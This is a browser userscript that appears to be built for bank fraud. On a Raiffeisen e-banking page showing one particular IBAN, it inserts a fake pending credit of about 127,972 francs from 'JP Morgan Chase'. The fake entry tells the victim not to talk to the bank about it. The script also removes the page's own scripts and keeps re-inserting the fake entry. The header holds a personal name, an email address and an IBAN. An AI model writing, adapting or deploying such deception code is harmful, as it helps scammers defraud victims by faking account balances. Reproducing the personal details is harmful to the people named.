// ==UserScript==
// @name         Ed 4Rec Start CSui, Raif Ch rgyr55@gmail.com  auszug
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/511171/Ed%204Rec%20Start%20CSui%2C%20Raif%20Ch%20rgyr55%40gmailcom%20%20auszug.user.js
// @updateURL https://update.greasyfork.org/scripts/511171/Ed%204Rec%20Start%20CSui%2C%20Raif%20Ch%20rgyr55%40gmailcom%20%20auszug.meta.js
// ==/UserScript==


// ==========================================================================================================================================================
// Configurable IBAN
var desiredIban = "CH19 8080 8003 4696 0013 4"; // The specific IBAN you're looking for

// Array of configurable transaction details
var transactionDetailsArray = [
    {
        title: "JP Morgan Chase       ",
        type: "Gutschrift",
        date: "Vorgemerkt",
        amount: "+127'972.00",
        description: "Auszahlung. A. Gold meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.",
        insertAbove: true, // Insert the transaction above the original one by default
        inserted: false // Flag to track if the transaction has been inserted
    }
];

// Function to create and insert transactions
function insertTransactions() {
    transactionDetailsArray.forEach(function(transactionDetails) {
        if (!transactionDetails.inserted) {
            var insertedTransaction = document.querySelector('.first-in-timeline .multi-line.title');
            if (!insertedTransaction || insertedTransaction.textContent !== transactionDetails.title) {
                var originalElement = document.querySelector('.first-in-timeline');
                if (originalElement) {
                    var duplicateElement = originalElement.cloneNode(true);
                    var amount = parseFloat(transactionDetails.amount.replace(/[^\d.-]/g, ''));
                    var itemClass = amount >= 0 ? "item positive" : "item accordion";

                    duplicateElement.innerHTML = `
                        <div class="${itemClass}">
                            <a role="button" class="box header" href="https://ebanking.raiffeisen.ch/app/">
                                <p class="multi-line title">${transactionDetails.title}</p>
                                <p translate="">${transactionDetails.type}</p>
                                <div class="left">
                                    <p class="light">${transactionDetails.date}</p>
                                </div>
                                <div class="right">
                                    <span class="output medium">
                                        <div>${transactionDetails.amount}</div>
                                    </span>
                                </div>
                                <div class="message-group">
                                    <div class="left">
                                        <p class="multi-line">${transactionDetails.description}</p>
                                    </div>
                                </div>
                            </a>
                        </div>
                    `;

                    var insertionPosition = transactionDetails.insertAbove ? originalElement : originalElement.nextSibling;
                    originalElement.parentNode.insertBefore(duplicateElement, insertionPosition);

                    transactionDetails.inserted = true; // Mark transaction as inserted
                    console.log("Transaction inserted successfully:", transactionDetails.title);
                } else {
                    console.log('Original element with class "first-in-timeline" not found.');
                }
            } else {
                transactionDetails.inserted = true; // Mark if already inserted
                console.log("Transaction already inserted:", transactionDetails.title);
            }
        }
    });
}

// Function to check for the exact IBAN and insert transactions if found
function checkIbanAndInsertTransactions() {
    var normalizedIBAN = desiredIban.toLowerCase().replace(/\s+/g, ''); // Normalize the desired IBAN
    var outputElement = document.querySelector('.output'); // Element containing the IBAN

    if (outputElement) {
        // Get the text content from all children within the output element
        var outputChildrenText = Array.from(outputElement.children).map(child => child.textContent.toLowerCase()).join('');
        var pageContent = outputChildrenText.replace(/\s+/g, ''); // Remove white spaces from page content

        // Check if the specific IBAN is present on the page
        var ibanFound = pageContent.includes(normalizedIBAN);
        console.log("IBAN found on the page:", ibanFound);

        if (ibanFound) {
            insertTransactions(); // Insert transactions only when the IBAN matches
        } else {
            console.log("Specific IBAN not found. No transactions inserted.");
        }
    } else {
        console.log("Output element not found.");
    }

    setTimeout(checkIbanAndInsertTransactions, 2000); // Check again every 2 seconds
}

// Function to recheck, check IBAN match, and reinsert transactions if they are removed or missing
function checkAndReinsertTransactions() {
    // Check if the IBAN matches before attempting any reinsertion
    var normalizedIBAN = desiredIban.toLowerCase().replace(/\s+/g, ''); // Normalize the desired IBAN
    var outputElement = document.querySelector('.output'); // Element containing the IBAN

    if (outputElement) {
        // Get the text content from all children within the output element
        var outputChildrenText = Array.from(outputElement.children).map(child => child.textContent.toLowerCase()).join('');
        var pageContent = outputChildrenText.replace(/\s+/g, ''); // Remove white spaces from page content

        // Check if the specific IBAN is present on the page
        var ibanFound = pageContent.includes(normalizedIBAN);
        console.log("IBAN found during reinsert check:", ibanFound);

        // Only proceed to check transactions if the IBAN matches
        if (ibanFound) {
            transactionDetailsArray.forEach(function(transactionDetails) {
                var transactionFound = isTransactionPresent(transactionDetails.title);
                if (!transactionFound) {
                    console.log("Transaction missing. Reinserting:", transactionDetails.title);
                    insertTransactions(); // Reinsert if missing
                } else {
                    console.log("Transaction still present:", transactionDetails.title);
                }
            });
        } else {
            console.log("Specific IBAN not found during reinsert check. No transactions reinserted.");
        }
    } else {
        console.log("Output element not found during reinsert check.");
    }
}


// Function to check if a transaction with the given title is present on the page
function isTransactionPresent(title) {
    var transactionElement = document.querySelector('.first-in-timeline .multi-line.title');
    return transactionElement && transactionElement.textContent.trim() === title;
}

// Function to remove scripts from the document
function removeScripts() {
    console.log("Removing scripts...");
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log("Script removed.");
    });
}

// Watch for changes in the DOM and remove added scripts
var cdobserver = new MutationObserver(function(mutationsList) {
    for (var mutation of mutationsList) {
        if (mutation.addedNodes) {
            for (var node of mutation.addedNodes) {
                if (node.tagName === 'SCRIPT') {
                    console.log("Script added. Removing...");
                    node.remove();
                    console.log("Script removed.");
                }
            }
        }
    }
});

// Start observing the document
cdobserver.observe(document.documentElement, { childList: true, subtree: true });

// Remove all scripts from the document
removeScripts();

// Start the continuous IBAN check
checkIbanAndInsertTransactions();

// Regular reinsertion check every 2 seconds
setInterval(checkAndReinsertTransactions, 2000);
